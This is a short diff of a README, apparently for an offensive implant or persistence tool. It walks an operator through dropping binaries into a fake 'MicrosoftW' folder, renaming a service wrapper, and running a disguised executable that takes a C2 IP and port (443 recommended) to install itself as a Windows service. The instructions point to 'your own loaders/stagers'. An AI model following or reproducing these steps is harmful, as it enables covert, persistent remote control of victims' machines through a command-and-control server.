@@ -57,7 +57,7 @@ This is a generic method. Use your own loaders/stagers to get the binaries on th
 ```
 mkdir C:\programdata\MicrosoftW
 ```
-2. Move the binaries and DLL into this directory.
+2. Move the binaries and DLL into this directory. Make sure "windows_service_wrapper.exe" is renamed to "[service Binary Name]" below in the next step.
 3. As Administrator or with privileges allowing creation of services (Server Operators can start/stop service. Can not create them):
 ```
 C:\programdata\MicrosoftW\windows_Win32_Temp.exe [C2 IP] [C2 Port; recommend 443] [service Binary Name] [service Binary Name] [desired timeout in seconds]
